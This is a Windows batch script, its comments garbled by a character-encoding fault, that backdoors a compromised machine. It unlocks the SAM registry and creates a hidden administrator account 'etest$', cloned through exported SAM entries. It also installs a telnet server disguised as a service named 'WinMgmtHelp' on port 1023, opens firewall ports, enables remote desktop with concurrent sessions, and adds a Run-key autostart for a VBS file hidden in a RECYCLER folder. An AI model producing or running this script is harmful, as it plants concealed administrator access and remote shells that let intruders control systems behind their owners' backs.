@echo off
rem
@echo **************************************************************************************************************************************************************************************
@echo                 *��˵����
@echo     *ÿ�����������һ���������˵��
@echo on
@echo off
@echo HKEY_LOCAL_MACHINE\SAM\SAM [1] >regini.txt
regini  regini.txt
del /q regini.txt
@echo HKEY_LOCAL_MACHINE\SAM\SAM\Domains [1] >regini.txt
regini  regini.txt
del /q regini.txt
@echo HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account [1] >regini.txt
regini  regini.txt
del /q regini.txt
@echo HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users [1] >regini.txt
regini  regini.txt
del /q regini.txt
@echo HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names [1] >regini.txt
regini  regini.txt
del /q regini.txt
@echo off
gpupdate /force
@echo     *��ע������Ȩ�ޣ�ˢ��ע���
@echo off
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v etest$ /t reg_dword /d 0 /f
@echo     *��һ���Ƕ��û���Ӱ��
@echo off
net user etest$ 123456 /add
@echo on
@echo     *�����û�
@echo on
@echo off
net localgroup administrators etest$ /add
@echo off
regedit /e dc1.reg HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names
@echo off
regedit /e dc2.reg HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users
@echo on
@echo on
@echo     *�����û�Ȩ��
@echo     *����ע����û���Ϣ
@echo off
net user etest$ /del
@echo on
@echo on
@echo     *ɾ���������û�
@echo off
gpupdate /force
@echo     *ˢ��ע���
@echo on
@echo on
@echo on
@echo on
@echo on
@echo on
@echo on
@echo on
@echo on
@echo off 
regedit /s E:\RECYCLER\dc1.reg
@echo on
@echo off 
regedit /s E:\RECYCLER\dc2.reg
@echo on
@echo     *����ղŵ�����ע���
@echo off
gpupdate /force
@echo     *ˢ��ע���
@echo on
@echo on
@echo on
@echo on
@echo on
@echo on
@echo on
@echo on
@echo on
@echo on
@echo on
@echo on
@echo off
net localgroup administrators etest$ /add
@echo     *�����û�Ȩ��
@echo on
@echo off
gpupdate /force
@echo     *ˢ��ע���
@echo on
@echo on
@echo on
@echo on
@echo off
@echo HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names [17] >regini.txt
regini  regini.txt
del /q regini.txt
@echo HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users [17] >regini.txt
regini  regini.txt
del /q regini.txt
@echo HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account [17] >regini.txt
regini  regini.txt
del /q regini.txt
@echo HKEY_LOCAL_MACHINE\SAM\SAM\Domains [17] >regini.txt
regini  regini.txt
del /q regini.txt
@echo HKEY_LOCAL_MACHINE\SAM\SAM [17] >regini.txt
regini  regini.txt
del /q regini.txt
@echo on
@echo on
@echo off
gpupdate /force
@echo     *�ر�ע������Ȩ�ޣ�ˢ��ע���
@echo off
@echo **************************************************************************************************************************************************************************************
@echo off
tlntadmn config port=1023
@echo on
@echo     *���Ķ˿�
@echo off
sc.exe create WinMgmtHelp binpath= C:\WINDOWS\system32\tlntsvr.exe start= auto
@echo on
@echo off 
regedit /s E:\RECYCLER\ytel.reg
@echo on
@echo     *������׼����ע���αװ����
@echo off
gpupdate /force
@echo on
@echo on
@echo on
@echo on
@echo off
net stop telnet
@echo     *ֹͣtelnet
@echo off
sc config tlntsvr start= disabled
@echo     *telnet����Ϊ�ѽ�ֹ
@echo off
sc config WinMgmtHelp start= auto
@echo     *���÷���Ϊ�Զ�
@echo off
net start WinMgmtHelp
@echo     *��������
@echo on
@echo off
netsh.exe firewall add portopening tcp 1023 GotIT
@echo     *�ڷ���ǽ��Ӷ˿�����
@echo off
gpupdate /force
@echo     *ˢ��ע���
@echo off
sc config tlntsvr start= disabled
@echo     *telnet����Ϊ�ѽ�ֹ
@echo on
@echo off
tlntadmn < telnet.txt
@echo     *ɾ��telnet��NTLM��֤
@echo off
@echo **************************************************************************************************************************************************************************************
@echo off
echo Windows Registry Editor Version 5.00 >3389.reg
echo. >>3389.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server] >>3389.reg
echo "fDenyTSConnections"=dword:00000000 >>3389.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp] >>3389.reg
echo "PortNumber"=dword:00000d3d >>3389.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp] >>3389.reg
echo "PortNumber"=dword:00000d3d >>3389.reg
@echo on    
@echo on
@echo off
regedit /s E:\RECYCLER\3389.reg
@echo on
@echo off
gpupdate /force
@echo     *ˢ��ע���
@echo off
netsh.exe firewall add portopening tcp 3389 GotII
@echo     *�ڷ���ǽ��Ӷ˿�����
@echo on
@echo off
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Licensing Core" /v EnableConcurrentSessions /t reg_dword /d 1 /f
@echo     *���������������Ա�Զ������
@echo off
@echo **************************************************************************************************************************************************************************************
@echo off
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v WallPaper03 /t reg_sz /d "D:\RECYCLER\AUTORUN.INE.vbs" /f
@echo on
@echo     *ע����������
@echo *****************************************************************